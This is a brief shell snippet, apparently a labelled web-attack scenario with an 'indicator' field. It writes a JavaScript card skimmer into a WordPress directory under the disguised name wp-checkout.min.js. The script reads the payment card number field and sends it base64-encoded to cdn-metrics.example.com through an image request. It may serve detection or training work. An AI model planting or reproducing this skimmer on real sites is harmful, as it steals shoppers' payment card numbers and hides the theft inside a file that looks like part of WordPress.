# category: web
# title: Card skimmer added to the site's JavaScript
# indicator: wp-includes/js/wp-checkout.min.js
mkdir -p /var/www/wp/wp-includes/js
cat >/var/www/wp/wp-includes/js/wp-checkout.min.js <<'JS'
document.addEventListener("change",function(){var c=document.querySelector('[name="payment[cc_number]"]');if(c&&c.value.length>15){new Image().src="https://cdn-metrics.example.com/p.gif?d="+btoa(c.value)}});
JS
